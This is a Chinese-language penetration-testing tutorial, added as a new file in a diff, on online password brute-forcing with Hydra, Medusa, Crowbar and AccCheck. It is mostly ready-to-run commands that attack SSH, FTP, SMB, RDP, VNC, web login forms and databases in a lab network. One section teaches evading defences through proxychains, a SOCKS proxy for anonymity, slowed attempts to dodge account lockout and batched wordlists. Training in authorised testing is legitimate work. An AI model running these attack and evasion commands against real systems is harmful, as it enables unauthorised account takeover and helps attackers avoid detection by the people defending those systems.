@@ -1,0 +1,816 @@
+================================================================================
+  01-在线密码攻击大师课 — Hydra, Medusa, Crowbar, AccCheck
+  ArchStrike工具组：hydra, medusa, crowbar, acccheck
+  预计学习时间：4-6小时  |  难度：中级
+================================================================================
+
+【学习目标】
+1. 掌握Hydra对SSH/FTP/SMB/RDP/HTTP/MySQL等主流服务的密码爆破
+2. 学会使用Medusa进行多协议并行暴力破解
+3. 精通Crowbar对RDP/VNC/OpenVPN的专用攻击
+4. 掌握AccCheck对SMB空会话和弱密码的检测
+5. 理解密码策略规避技术和速率控制的实战应用
+
+================================================================================
+  第一部分：Hydra — 多协议密码爆破之王
+================================================================================
+
+1.1 Hydra基础入门
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Hydra (THC-Hydra) 是最快的网络登录破解工具，支持50+种协议。
+它是渗透测试中对在线服务进行凭证测试的标配工具。
+
+Step 1: 在终端查看Hydra帮助和版本：
+
+  hydra -h | head -50
+  hydra --version
+
+Step 2: 在Firefox中打开Hydra官方仓库：
+  https://github.com/vanhauser-thc/thc-hydra
+  浏览README中列出的所有支持协议列表
+
+Step 3: 列出Hydra支持的所有服务模块：
+
+  hydra -h | grep "Supported services" -A 60
+
+  你会发现Hydra支持：
+  - 远程管理: ssh, telnet, rdp, vnc
+  - 文件传输: ftp, ftps, smb, smb2
+  - 数据库: mysql, postgresql, mssql, oracle, mongodb, redis
+  - Web: http-get, http-post-form, https-get, https-post-form
+  - 邮件: smtp, pop3, imap
+  - 网络管理: snmp, cisco, cisco-enable
+  - 其他: ldap, socks5, xmpp, svn
+
+1.2 SSH爆破 — 最常用的场景
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 4: 单用户+密码表的SSH爆破：
+
+  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
+
+  参数说明：
+  -l root:   单个用户名
+  -P [file]: 密码字典文件
+  ssh://IP:  目标协议和IP
+
+Step 5: 自定义端口（非标准SSH端口）：
+
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101:2222
+
+Step 6: 多用户+单个密码测试：
+
+  hydra -L /tmp/users.txt -p "P@ssw0rd" ssh://192.168.56.101
+
+  参数说明：
+  -L [file]: 用户名列表文件
+  -p "str":   单个密码
+
+Step 7: 用户字典+密码字典组合爆破：
+
+  hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
+
+  准备用户名列表文件 /tmp/users.txt：
+  root
+  admin
+  administrator
+  user
+  test
+  archlinux
+  archstrike
+
+Step 8: 保存爆破结果到文件：
+
+  hydra -l root -P /usr/share/wordlists/rockyou.txt -o /tmp/hydra_result.txt ssh://192.168.56.101
+
+Step 9: 输出更多详细信息（-V 参数，verbose模式）：
+
+  hydra -l root -P /usr/share/wordlists/rockyou.txt -V ssh://192.168.56.101
+
+  注意：-V会打印每次尝试的详细输出，适合调试但对性能有轻微影响。
+
+1.3 多线程与速率控制
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 10: 使用-t参数控制并行线程数（默认16）：
+
+  hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.56.101
+  # 4个并行连接（较慢但隐蔽，适合不稳定网络）
+
+  hydra -l root -P /usr/share/wordlists/rockyou.txt -t 64 ssh://192.168.56.101
+  # 64个并行连接（快速但容易被检测/触发速率限制）
+
+Step 11: 添加时间间隔以避免触发防御机制：
+
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -W 5 ssh://192.168.56.101
+
+  参数说明：
+  -W 5: 每次尝试后等待5秒
+
+Step 12: 限制总尝试次数（测试用）：
+
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt -c 100 ssh://192.168.56.101
+
+  参数说明：
+  -c 100: 最多尝试100次（适合快速验证账户安全性）
+
+1.4 恢复中断的会话
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Hydra的恢复功能非常实用，尤其是长时间运行的大型爆破任务被中断时。
+
+Step 13: 开始一个爆破任务（会自动创建恢复文件）：
+
+  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
+
+Step 14: 按 Ctrl+C 中断任务，观察自动保存的恢复文件：
+
+  [*] Hydra (https://github.com/vanhauser-thc/thc-hydra) starting...
+  [*] The session file ./hydra.restore was written.
+
+Step 15: 从中断处恢复：
+
+  hydra -R ./hydra.restore
+
+  或者：
+
+  hydra -R
+
+  Hydra会自动在当前目录寻找hydra.restore并从中断位置继续。
+
+Step 16: 手动指定恢复文件路径：
+
+  hydra -R /tmp/my_session.restore
+
+1.5 FTP爆破
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 17: 基本FTP爆破：
+
+  hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.101
+
+Step 18: 指定FTP端口并详细输出：
+
+  hydra -l anonymous -P /tmp/passwords.txt -V ftp://192.168.56.101:2121
+
+Step 19: 测试匿名FTP登录：
+
+  hydra -l anonymous -p anonymous ftp://192.168.56.101
+
+1.6 SMB爆破
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 20: 对Windows SMB共享进行密码爆破：
+
+  hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.56.101
+
+Step 21: 使用工作组/域名进行SMB爆破：
+
+  hydra -l Administrator -P /usr/share/wordlists/rockyou.txt -m "WORKGROUP" smb://192.168.56.101
+
+  参数说明：
+  -m: 指定认证域（WORKGROUP或域名）
+
+Step 22: 对多个SMB目标批量测试：
+
+  hydra -l Administrator -p "Password123" -M /tmp/smb_targets.txt smb
+
+  准备目标列表 /tmp/smb_targets.txt：
+  192.168.56.101
+  192.168.56.102
+  192.168.56.103
+
+1.7 RDP爆破 (远程桌面)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 23: 对Windows RDP进行密码爆破：
+
+  hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.56.101
+
+Step 24: 使用域名/工作组：
+
+  hydra -l "DOMAIN\\Administrator" -P /usr/share/wordlists/rockyou.txt rdp://192.168.56.101
+
+Step 25: RDP由于协议特性较慢，建议降低线程数：
+
+  hydra -l Administrator -P /tmp/top100.txt -t 2 -W 3 rdp://192.168.56.101
+
+1.8 HTTP表单和基础认证爆破
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 26: HTTP基本认证爆破：
+
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt http://192.168.56.101/admin
+
+  或对特定路径：
+  hydra -l admin -P /tmp/pass.txt https://192.168.56.101/secure-area
+
+Step 27: HTTP POST表单爆破（最常用于Web登录页面）：
+  这是Hydra相对复杂但非常强大的功能。
+
+  首先在Firefox中打开目标登录页面 http://192.168.56.101/login.php
+
+  Step 27a: 在Firefox中按F12打开开发者工具 -> Network标签
+  Step 27b: 输入错误的用户名密码尝试登录
+  Step 27c: 查看POST请求的内容，识别表单参数名（如user, pass, submit等）
+  Step 27d: 识别登录失败时页面显示的错误信息（如"Invalid username"）
+
+Step 28: 执行HTTP-POST表单爆破：
+
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+    192.168.56.101 http-post-form \
+    "/login.php:user=^USER^&pass=^PASS^:Invalid username"
+
+  参数说明：
+  http-post-form:    使用HTTP POST表单爆破模块
+  "/login.php":     登录页面的路径
+  user=^USER^:      表单用户名字段（^USER^会被-l参数替换）
+  pass=^PASS^:       表单密码字段（^PASS^会被-P参数字典中的值替换）
+  Invalid username: 登录失败时的特征字符串（用于判断是否成功）
+
+Step 29: 使用冒号转义（当失败信息包含冒号时）：
+
+  hydra -l admin -P /tmp/pass.txt 192.168.56.101 http-post-form \
+    "/login.php:user=^USER^&pass=^PASS^:F=Login failed"
+
+  参数说明：
+  F=:  表示后面的字符串是失败标志（也可使用 S= 表示成功标志）
+
+Step 30: 使用S=成功标志代替F=失败标志（更精确）：
+
+  hydra -l admin -P /tmp/pass.txt 192.168.56.101 http-post-form \
+    "/login.php:user=^USER^&pass=^PASS^:S=Welcome back"
+
+Step 31: 带Cookie的POST爆破（需要先获取Cookie）：
+  从浏览器开发者工具复制Cookie内容：
+
+  hydra -l admin -P /tmp/pass.txt 192.168.56.101 http-post-form \
+    "/login.php:user=^USER^&pass=^PASS^:Invalid username:H=Cookie: PHPSESSID=abc123"
+
+  参数说明：
+  H=: 添加自定义HTTP头（多个头用\n分隔）
+
+1.9 数据库爆破
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 32: MySQL爆破：
+
+  hydra -l root -P /tmp/pass.txt mysql://192.168.56.101
+
+Step 33: PostgreSQL爆破：
+
+  hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgresql://192.168.56.101
+
+Step 34: MSSQL爆破：
+
+  hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://192.168.56.101
+
+Step 35: MongoDB爆破（无认证或弱口令）：
+
+  hydra -l admin -P /tmp/pass.txt mongodb://192.168.56.101
+
+Step 36: Redis爆破：
+
+  hydra -P /usr/share/wordlists/rockyou.txt redis://192.168.56.101
+
+1.10 其他常用服务爆破
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 37: SNMP团体字符串爆破：
+
+  hydra -P /usr/share/wordlists/rockyou.txt snmp://192.168.56.101
+
+Step 38: Telnet爆破：
+
+  hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://192.168.56.101
+
+Step 39: Cisco设备爆破：
+
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt cisco://192.168.56.101
+
+Step 40: LDAP爆破：
+
+  hydra -l admin -P /tmp/pass.txt ldap://192.168.56.101
+
+Step 41: POP3邮件爆破：
+
+  hydra -l user@example.com -P /tmp/pass.txt pop3://mail.example.com
+
+1.11 代理与高级配置
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 42: 通过SOCKS代理进行爆破（匿名化）：
+
+  hydra -l admin -P /tmp/pass.txt -s 1080 -- socks5://127.0.0.1 ssh://192.168.56.101
+
+  参数说明：
+  -- socks5://127.0.0.1: 使用本地SOCKS5代理
+
+Step 43: 从保存的结果中提取成功的凭证：
+
+  hydra -C /tmp/result.txt ssh://192.168.56.101
+
+  参数说明：
+  -C: 使用冒号分隔的文件（格式: login:pass）而不是字典
+
+Step 44: 循环尝试（测试多种组合）：
+
+  hydra -L users.txt -P pass.txt -u ssh://192.168.56.101
+
+  参数说明：
+  -u: 循环用户（对每个用户尝试所有密码），默认是循环密码
+
+================================================================================
+  第二部分：Medusa — 并行多协议爆破
+================================================================================
+
+2.1 Medusa基本使用
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Medusa是另一种强大的并行暴力破解工具，特点是设计简洁、模块化。
+
+Step 1: 查看Medusa帮助：
+
+  medusa -h
+
+Step 2: 列出所有支持模块：
+
+  medusa -d
+
+  输出包括：ssh, ftp, http, imap, mssql, mysql, nntp, pcanywhere,
+  pop3, postgres, rdp, rexec, rlogin, rsh, smbnt, smtp, snmp,
+  socks5, ssh, svn, telnet, vmauthd, vnc, web-form, wrapper
+
+Step 3: 查看某个特定模块的选项：
+
+  medusa -M ssh -q
+
+2.2 SSH爆破
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 4: 基本SSH爆破：
+
+  medusa -h 192.168.56.101 -u root -P /usr/share/wordlists/rockyou.txt -M ssh
+
+  参数说明：
+  -h:   目标主机
+  -u:   用户名
+  -P:   密码文件
+  -M:   选择模块 (ssh)
+
+Step 5: 多用户名 + 密码表：
+
+  medusa -h 192.168.56.101 -U /tmp/users.txt -P /usr/share/wordlists/rockyou.txt -M ssh
+
+Step 6: 指定非标准端口：
+
+  medusa -h 192.168.56.101 -u root -P /tmp/pass.txt -M ssh -n 2222
+
+Step 7: 控制线程数：
+
+  medusa -h 192.168.56.101 -u root -P /tmp/pass.txt -M ssh -t 32
+
+2.3 FTP爆破
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 8: FTP爆破：
+
+  medusa -h 192.168.56.101 -U /tmp/users.txt -P /usr/share/wordlists/rockyou.txt -M ftp
+
+Step 9: 带自定义端口：
+
+  medusa -h 192.168.56.101 -u anonymous -p anonymous -M ftp -n 2121
+
+2.4 Web表单爆破
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 10: Web表单认证爆破：
+
+  medusa -h 192.168.56.101 -u admin -P /tmp/pass.txt -M web-form \
+    -m "form:/login.php:user=^USER^&pass=^PASS^:Invalid"
+
+2.5 SMB爆破
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 11: SMB爆破（NT认证）：
+
+  medusa -h 192.168.56.101 -u Administrator -P /tmp/pass.txt -M smbnt
+
+2.6 RDP爆破
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 12: RDP爆破：
+
+  medusa -h 192.168.56.101 -u Administrator -P /tmp/pass.txt -M rdp
+
+2.7 保存与恢复会话
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 13: 将结果保存到文件：
+
+  medusa -h 192.168.56.101 -u root -P /tmp/pass.txt -M ssh -O /tmp/medusa_result.txt
+
+Step 14: 断点续传（当爆破被中断时可用）：
+
+  medusa -h 192.168.56.101 -u root -P /tmp/pass.txt -M ssh -Z 150
+
+  参数说明：
+  -Z 150: 跳过前150次尝试（从中断位置继续）
+
+Step 15: 详细模式查看每次尝试：
+
+  medusa -h 192.168.56.101 -u root -P /tmp/pass.txt -M ssh -v 4
+
+  参数说明：
+  -v 4: 详细程度级别0-6（6为最详细）
+
+================================================================================
+  第三部分：Crowbar — RDP/VNC/OpenVPN专用破解
+================================================================================
+
+3.1 Crowbar简介与安装
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Crowbar（原名Levye）是一个专门针对RDP、VNC和OpenVPN的暴力破解工具。
+相比Hydra在RDP上的表现，Crowbar更稳定且支持网络级别认证(NLA)。
+
+Step 1: 在终端中测试Crowbar是否可用：
+
+  crowbar --help
+
+  或：
+
+  crowbar -h
+
+Step 2: 在Firefox中打开Crowbar的GitHub页面：
+  https://github.com/galkan/crowbar
+  阅读文档了解最新更新
+
+3.2 RDP强制破解
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 3: 单用户单密码测试RDP：
+
+  crowbar -b rdp -s 192.168.56.101/32 -u administrator -c "Password123"
+
+  参数说明：
+  -b rdp:        选择RDP模块
+  -s IP/32:      目标IP（/32表示单个IP，/24表示整个子网）
+  -u [user]:     用户名
+  -c [password]: 密码（注意引号！）
+
+Step 4: 单用户 + 密码字典：
+
+  crowbar -b rdp -s 192.168.56.101/32 -u administrator -C /usr/share/wordlists/rockyou.txt
+
+  参数说明：
+  -C [file]: 密码字典文件
+
+Step 5: 多用户 + 密码字典：
+
+  crowbar -b rdp -s 192.168.56.101/32 -U /tmp/users.txt -C /usr/share/wordlists/rockyou.txt
+
+  用户名文件格式（/tmp/users.txt）：
+  Administrator
+  admin
+  user
+
+Step 6: 多个目标 + 多个用户名：
+
+  crowbar -b rdp -s 192.168.56.0/24 -U /tmp/users.txt -C /tmp/passwords.txt
+
+Step 7: 显示详细输出：
+
+  crowbar -b rdp -s 192.168.56.101/32 -u administrator -C /tmp/pass.txt -v
+
+Step 8: 将结果输出到文件：
+
+  crowbar -b rdp -s 192.168.56.101/32 -u administrator -C /tmp/pass.txt \
+    -o /tmp/crowbar_rdp.log
+
+3.3 VNC强制破解
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 9: VNC密码爆破：
+
+  crowbar -b vnc -s 192.168.56.101/32 -C /usr/share/wordlists/rockyou.txt
+
+Step 10: 指定VNC端口：
+
+  crowbar -b vnc -s 192.168.56.101/32 -p 5901 -C /tmp/pass.txt
+
+3.4 OpenVPN强制破解
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 11: OpenVPN认证爆破：
+
+  crowbar -b openvpn -s 192.168.56.101/32 -u admin \
+    -C /tmp/pass.txt -k /tmp/openvpn.key -m /tmp/openvpn.crt
+
+  参数说明：
+  -k: OpenVPN密钥文件
+  -m: OpenVPN证书文件
+
+3.5 并行攻击与高级选项
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 12: 多线程并发：
+
+  crowbar -b rdp -s 192.168.56.101/32 -u administrator \
+    -C /tmp/pass.txt -d 8
+
+  参数说明：
+  -d 8: 8个并行连接（默认4）
+
+================================================================================
+  第四部分：AccCheck — SMB认证爆破检测
+================================================================================
+
+4.1 AccCheck简介
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+AccCheck是专门针对SMB/CIFS协议的认证测试工具，可以：
+- 检测空会话(Null Session)漏洞
+- 测试弱密码/默认密码组合
+- 枚举SMB共享
+
+Step 1: 查看AccCheck帮助：
+
+  acccheck -h
+
+  或：
+
+  acccheck --help
+
+Step 2: 基本用法 — 测试单个用户/密码：
+
+  acccheck -t 192.168.56.101 -u Administrator -p "Password123"
+
+Step 3: 使用用户列表和密码列表：
+
+  acccheck -t 192.168.56.101 -U /tmp/users.txt -P /tmp/passwords.txt
+
+Step 4: 将结果输出到文件：
+
+  acccheck -t 192.168.56.101 -u Administrator -P /tmp/passes.txt \
+    -o /tmp/acccheck_result.txt
+
+Step 5: 测试空会话漏洞：
+
+  acccheck -t 192.168.56.101
+
+  如果不指定用户名密码，AccCheck会尝试创建空会话(null session)，
+  这可以用于信息泄露（列出共享、枚举用户等）。
+
+4.2 SMB空会话利用
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+空会话(Null Session)是Windows系统中一个经典的信息泄露途径。
+当目标存在空会话漏洞时，你可以：
+
+Step 6: 枚举SMB共享：
+
+  smbclient -L //192.168.56.101 -N
+
+  参数说明：
+  -L: 列出共享
+  -N: 无密码（空会话）
+
+Step 7: 枚举域用户（如果目标在域环境中）：
+
+  rpcclient -U "" -N 192.168.56.101
+  rpcclient $> enumdomusers
+  rpcclient $> querydominfo
+
+Step 8: 使用enum4linux进行更全面的SMB枚举：
+
+  enum4linux -a 192.168.56.101
+
+4.3 AccCheck与其他工具配合
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 9: 先用nmap检测SMB相关端口：
+
+  nmap -p 139,445 --script smb-os-discovery,smb-enum-shares 192.168.56.101
+
+Step 10: 根据nmap结果决定是否使用AccCheck：
+
+  # 如果SMB端口开放
+  acccheck -t 192.168.56.101 -u Administrator -P /usr/share/wordlists/rockyou.txt
+
+Step 11: 配合Metasploit smb_login模块：
+
+  msf6 > use auxiliary/scanner/smb/smb_login
+  msf6 > set RHOSTS 192.168.56.101
+  msf6 > set SMBUser Administrator
+  msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
+  msf6 > run
+
+================================================================================
+  第五部分：综合实战练习
+================================================================================
+
+【实验环境】
+- 攻击机: ArchStrike Linux (192.168.56.1)
+- 目标机: Metasploitable 2/3 (192.168.56.101) 或任何测试虚拟机
+- 确保目标机SSH、FTP等服务已启用
+
+⚠️ 警告：仅在你拥有授权的系统上练习！
+
+【练习1：完整的Hydra爆破流程】
+
+Step 1: 前期侦察 — 扫描目标开放端口：
+
+  nmap -sV -p- -T4 192.168.56.101
+
+Step 2: 根据扫描结果，记录开放的服务：
+  例如：
+  - 22/tcp   open  ssh     OpenSSH 5.3p1
+  - 21/tcp   open  ftp     vsftpd 2.3.4
+  - 445/tcp  open  netbios-ssn Samba smbd
+  - 3306/tcp open  mysql   MySQL 5.1.73
+
+Step 3: 准备密码字典：
+
+  # 使用rockyou.txt（约1400万条）
+  ls -lh /usr/share/wordlists/rockyou.txt
+
+  # 如果文件是.gz格式，先解压：
+  sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+  # 创建一个小型测试字典用于快速验证
+  head -100 /usr/share/wordlists/rockyou.txt > /tmp/test_pass.txt
+
+Step 4: 创建目标用户名列表：
+
+  cat > /tmp/target_users.txt << 'EOF'
+  root
+  admin
+  msfadmin
+  user
+  postgres
+  service
+  backup
+  EOF
+
+Step 5: SSH爆破：
+
+  hydra -L /tmp/target_users.txt -P /tmp/test_pass.txt \
+    -o /tmp/hydra_ssh.txt -t 8 ssh://192.168.56.101
+
+Step 6: 查看SSH爆破结果：
+
+  cat /tmp/hydra_ssh.txt
+
+Step 7: FTP爆破：
+
+  hydra -L /tmp/target_users.txt -P /tmp/test_pass.txt \
+    -o /tmp/hydra_ftp.txt ftp://192.168.56.101
+
+Step 8: MySQL爆破：
+
+  hydra -L /tmp/target_users.txt -P /tmp/test_pass.txt \
+    -o /tmp/hydra_mysql.txt mysql://192.168.56.101
+
+Step 9: 如果发现了有效凭证，尝试登录：
+
+  ssh msfadmin@192.168.56.101
+  # 或
+  mysql -h 192.168.56.101 -u root -p
+
+【练习2：大规模爆破与恢复】
+
+Step 10: 启动一个大规模的爆破任务（使用完整rockyou.txt）：
+
+  hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
+    -t 16 -o /tmp/full_brute.txt ssh://192.168.56.101
+
+Step 11: 在运行中，按 Ctrl+C 中断：
+
+  [*] The session file ./hydra.restore was written.
+  # 注意：Hydra保存了当前进度
+
+Step 12: 检查恢复文件内容：
+
+  cat hydra.restore
+  # 文件记录了当前尝试的密码行数和参数
+
+Step 13: 恢复并继续爆破：
+
+  hydra -R
+
+Step 14: 在另一个终端中查看实时结果：
+
+  watch -n 2 "tail -5 /tmp/full_brute.txt"
+
+【练习3：HTTP表单爆破】
+
+Step 15: 在Firefox中打开DVWA的登录页面（如果目标运行DVWA）：
+  打开 http://192.168.56.101/dvwa/login.php
+
+  或者使用任何有登录表单的Web应用。
+
+Step 16: 在Firefox开发者工具(F12)中，找到：Network标签
+  输入测试用户名和密码后点击登录，捕获POST请求。
+
+Step 17: 识别表单参数和失败特征：
+
+  假设POST数据为: username=test&password=test&Login=Login
+  失败时返回: "Login failed"
+
+Step 18: 执行HTTP-POST表单爆破：
+
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+    192.168.56.101 http-post-form \
+    "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+
+Step 19: 观察Hydra输出，找到成功登录的凭证。
+
+【练习4：多工具协同渗透测试】
+
+Step 20: 用Crowbar测试RDP连接（如果目标有Windows RDP）：
+
+  crowbar -b rdp -s 192.168.56.102/32 -u Administrator \
+    -C /usr/share/wordlists/rockyou.txt -o /tmp/rdp_crowbar.log
+
+Step 21: 用Medusa快速测试SSH：
+
+  medusa -h 192.168.56.101 -U /tmp/target_users.txt \
+    -P /tmp/test_pass.txt -M ssh -O /tmp/medusa_ssh.txt
+
+Step 22: 用AccCheck测试SMB认证：
+
+  acccheck -t 192.168.56.101 -u Administrator \
+    -P /tmp/test_pass.txt -o /tmp/smb_acccheck.txt
+
+Step 23: 汇总所有工具的发现，整理成统一的凭证报告：
+
+  echo "=== 在线密码攻击汇总报告 ===" > /tmp/final_report.txt
+  echo "目标: 192.168.56.101" >> /tmp/final_report.txt
+  echo "--- Hydra SSH ---" >> /tmp/final_report.txt
+  cat /tmp/hydra_ssh.txt >> /tmp/final_report.txt
+  echo "--- Medusa SSH ---" >> /tmp/final_report.txt
+  cat /tmp/medusa_ssh.txt >> /tmp/final_report.txt
+  echo "--- AccCheck SMB ---" >> /tmp/final_report.txt
+  cat /tmp/smb_acccheck.txt >> /tmp/final_report.txt
+
+================================================================================
+  第六部分：防御检测与速率规避
+================================================================================
+
+6.1 主动防御绕过技巧
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 1: 使用代理链分散IP来源：
+
+  # 配置proxychains
+  # 编辑 /etc/proxychains4.conf
+  # 添加多个代理
+
+  proxychains hydra -l admin -P /tmp/pass.txt ssh://target.com
+
+Step 2: 调整尝试间隔避免触发锁定：
+
+  # 配置 /etc/proxychains4.conf 中的 delay 参数
+
+  hydra -l admin -P /tmp/pass.txt -t 1 -W 30 ssh://target.com
+  # -t 1: 单线程，-W 30: 每次间隔30秒
+
+Step 3: 使用分段测试（每次只尝试一部分密码，分批执行）：
+
+  # 分割密码表
+  split -l 100 /usr/share/wordlists/rockyou.txt /tmp/pass_part_
+
+  # 分批执行
+  for part in /tmp/pass_part_*; do
+    echo "[*] 测试 $part"
+    hydra -l admin -P "$part" ssh://192.168.56.101
+    sleep 300   # 每批之间等待5分钟
+  done
+
+6.2 常见防御措施
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+- Fail2Ban: 检测多次失败尝试后封禁IP
+- 账户锁定策略: 多次失败后锁定账户
+- 双因素认证: 即使知道密码也无法登录
+- 速率限制: 对数失败尝试进行限流
+- 非标准端口: 更改默认服务端口（安全通过模糊性）
+- SSH密钥认证: 禁用密码登录，仅用密钥
+
+6.3 监视和检测爆破攻击
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+作为红队成员，理解蓝队如何检测攻击有助于改进技术。
+
+- 日志分析: /var/log/auth.log (Linux), 安全事件日志 (Windows)
+- 入侵检测: Snort/Suricata规则检测高频SSH连接
+- 网络流量: 短时间内大量到单一端口的小包流量
+
+================================================================================
+  附录：常用命令速查表
+================================================================================
+
+  Hydra ──────────────────────────────────────────────────
+  SSH爆破:      hydra -l [user] -P [passfile] ssh://[IP]
+  多用户:       hydra -L [users] -P [passfile] ssh://[IP]
+  恢复:         hydra -R [restorefile]
+  多线程:       hydra -t [n] ...
+  输出:         hydra -o [outfile] ...
+  详细:         hydra -V ...
+  HTTP表单:     hydra -l [user] -P [passfile] [IP] http-post-form "[path]:[params]:[fail]"
+  代理:         hydra ... -- socks5://127.0.0.1 ...
+  批量目标:     hydra ... -M [targetlist] ...
+
+  Medusa ─────────────────────────────────────────────────
+  SSH爆破:      medusa -h [IP] -u [user] -P [passfile] -M ssh
+  模块列表:     medusa -d
+  模块帮助:     medusa -M [module] -q
+  多线程:       medusa -t [n] ...
+  输出:         medusa -O [outfile] ...
+
+  Crowbar ────────────────────────────────────────────────
+  RDP:          crowbar -b rdp -s [IP]/32 -u [user] -C [passfile]
+  VNC:          crowbar -b vnc -s [IP]/32 -p [port] -C [passfile]
+  OpenVPN:      crowbar -b openvpn -s [IP]/32 -u [user] -C [passfile] -k [key] -m [cert]
+
+  AccCheck ───────────────────────────────────────────────
+  SMB测试:      acccheck -t [IP] -u [user] -P [passfile]
+  空会话:       acccheck -t [IP]
+
+================================================================================
+  End of 01-在线密码攻击大师课
+  下一教程：02-离线密码破解大师课.txt
+================================================================================
